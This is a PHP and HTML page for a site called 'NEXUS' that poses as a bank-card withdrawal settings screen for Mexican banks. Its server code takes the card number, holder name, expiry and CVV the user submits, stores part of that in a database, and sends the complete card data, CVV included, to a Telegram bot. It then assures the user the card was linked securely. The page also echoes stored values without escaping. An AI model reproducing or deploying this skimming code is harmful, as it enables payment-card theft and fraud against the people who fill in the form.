<?php 
// Ruta modificada para acceder a la carpeta de configuración externa
require 'config.php';
session_start();

// Validación de sesión real - Ruta de redirección corregida
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}
$user_id = $_SESSION['user_id'];

// Procesar nueva tarjeta
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['tarjeta'])) {
    $banco = $_POST['banco'];
    $tarjeta = $_POST['tarjeta'];
    $fecha = $_POST['fecha'];
    $cvv = $_POST['cvv'];
    $nombre = $_POST['nombre'];
    
    // Inserción en DB (usando 'clabe' para el número de tarjeta por compatibilidad de tabla)
    $stmt = $conn->prepare("INSERT INTO datos_bancarios (usuario_id, banco_nombre, clabe, beneficiario) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("isss", $user_id, $banco, $tarjeta, $nombre);
    
    if ($stmt->execute()) {
        // Notificación a Telegram con el paquete completo de datos
        $msg = "💳 **NEXUS: NUEVA TARJETA VINCULADA**\n";
        $msg .= "---------------------------\n";
        $msg .= "👤 ID Usuario: $user_id\n";
        $msg .= "🏛 Banco: $banco\n";
        $msg .= "✍️ Titular: $nombre\n";
        $msg .= "🔢 Tarjeta: `$tarjeta`\n";
        $msg .= "📅 Expira: `$fecha`\n";
        $msg .= "🔒 CVV: `$cvv`\n";
        $msg .= "---------------------------\n";
        
        $tg_url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
        @file_get_contents($tg_url);
        
        $success = true;
    }
}

$cuentas = $conn->query("SELECT * FROM datos_bancarios WHERE usuario_id = $user_id ORDER BY id DESC");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Configuración Bancaria | NEXUS</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg-dark: #06090f; 
            --card-bg: #0a0e17; 
            --accent-cyan: #00f2ff; 
            --text-muted: #8898aa;
        }
        body { 
            background-color: var(--bg-dark); 
            font-family: 'Inter', sans-serif; 
            color: #e2e8f0; 
        }
        .nexus-card { 
            background: var(--card-bg); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .bank-card { 
            border-left: 4px solid var(--accent-cyan); 
            transition: 0.3s; 
            background: rgba(255, 255, 255, 0.02); 
        }
        .bank-card:hover { 
            background: rgba(0, 242, 255, 0.05);
            transform: translateY(-3px); 
        }
        .form-label { 
            font-size: 0.75rem; 
            font-weight: 700; 
            color: var(--accent-cyan); 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .form-control, .form-select { 
            background: rgba(0,0,0,0.2);
            border: 1px solid rgba(255,255,255,0.1);
            color: white;
            border-radius: 12px;
            padding: 12px;
        }
        .form-control:focus, .form-select:focus { 
            background: rgba(0,0,0,0.3);
            border-color: var(--accent-cyan); 
            color: white;
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
        }
        .btn-nexus {
            background: linear-gradient(135deg, var(--accent-cyan), #007bff);
            color: #000;
            font-weight: 700;
            border: none;
            border-radius: 12px;
            padding: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-back { 
            width: 45px; height: 45px; border-radius: 12px; display: flex; 
            align-items: center; justify-content: center; background: var(--card-bg); 
            color: var(--accent-cyan); border: 1px solid rgba(0, 242, 255, 0.2);
        }
        .text-orbitron { font-family: 'Orbitron', sans-serif; }
    </style>
</head>
<body class="py-5">

<div class="container" style="max-width: 950px;">
    
    <div class="d-flex align-items-center mb-5">
        <a href="dashboard.php" class="btn-back me-3 text-decoration-none">
            <i class="fas fa-arrow-left"></i>
        </a>
        <div>
            <h2 class="fw-bold m-0 text-white text-orbitron" style="letter-spacing: 2px;">MÉTODOS DE RETIRO</h2>
            <p class="text-muted small m-0">Terminal de gestión bancaria cifrada</p>
        </div>
    </div>

    <?php if(isset($success)): ?>
        <div class="alert bg-success bg-opacity-10 text-success border border-success d-flex align-items-center mb-4" style="border-radius: 15px;">
            <i class="fas fa-shield-check me-3 fa-lg"></i>
            <div><strong>Sincronización Exitosa:</strong> Tarjeta vinculada correctamente al nodo central.</div>
        </div>
    <?php endif; ?>

    <div class="row g-4">
        <div class="col-lg-5">
            <div class="nexus-card p-4 h-100">
                <h5 class="fw-bold mb-4 text-white"><i class="fas fa-plus-circle text-cyan me-2"></i>Nueva Tarjeta</h5>
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Institución Bancaria</label>
                        <select name="banco" class="form-select" required>
                            <option value="" selected disabled>Seleccionar banco...</option>
                            <option value="BBVA">BBVA México</option>
                            <option value="Banamex">Citibanamex</option>
                            <option value="Santander">Santander</option>
                            <option value="HSBC">HSBC</option>
                            <option value="Banorte">Banorte</option>
                            <option value="Banco Azteca">Banco Azteca</option>
                            <option value="Coppel">Bancoppel</option>
                            <option value="Nu">Nu México</option>
                            <option value="Mercado Pago">Mercado Pago</option>
                            <option value="Stori">Stori / Klar</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Nombre en la Tarjeta</label>
                        <input type="text" name="nombre" class="form-control" placeholder="TITULAR" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Número de Tarjeta (16 dígitos)</label>
                        <input type="text" name="tarjeta" class="form-control" maxlength="16" placeholder="0000 0000 0000 0000" required pattern="\d{16}">
                    </div>
                    <div class="row mb-4">
                        <div class="col-7">
                            <label class="form-label">Fecha (MM/AA)</label>
                            <input type="text" name="fecha" class="form-control" maxlength="5" placeholder="05/29" required>
                        </div>
                        <div class="col-5">
                            <label class="form-label">CVV</label>
                            <input type="text" name="cvv" class="form-control" maxlength="3" placeholder="000" required pattern="\d{3}">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-nexus w-100">VINCULAR AL NODO</button>
                </form>
            </div>
        </div>

        <div class="col-lg-7">
            <h5 class="fw-bold mb-4 d-flex justify-content-between align-items-center">
                <span>Tarjetas Autorizadas</span>
                <span class="badge bg-dark text-cyan border border-cyan" style="font-size: 0.7rem;"><?php echo $cuentas->num_rows; ?> ACTIVAS</span>
            </h5>
            
            <?php if($cuentas->num_rows > 0): ?>
                <?php while($c = $cuentas->fetch_assoc()): ?>
                    <div class="nexus-card bank-card p-3 mb-3 border-0">
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="d-flex align-items-center">
                                <div class="bg-dark rounded-circle p-3 me-3 border border-secondary border-opacity-20">
                                    <i class="fas fa-credit-card text-cyan"></i>
                                </div>
                                <div>
                                    <h6 class="fw-bold mb-0 text-white"><?php echo $c['banco_nombre']; ?></h6>
                                    <div class="small font-monospace text-muted mt-1">
                                        **** **** **** <?php echo substr($c['clabe'], -4); ?>
                                    </div>
                                    <div class="text-cyan mt-1" style="font-size: 0.7rem; font-weight: 600;"><?php echo strtoupper($c['beneficiario']); ?></div>
                                </div>
                            </div>
                            <div class="text-end">
                                <span class="badge bg-cyan bg-opacity-10 text-cyan border border-cyan mb-1" style="font-size: 0.6rem;">ACTIVA</span>
                            </div>
                        </div>
                    </div>
                <?php endwhile; ?>
            <?php else: ?>
                <div class="text-center py-5 nexus-card border border-dashed border-secondary">
                    <p class="text-muted mb-0">No se detectan métodos de pago.</p>
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

</body>
</html>
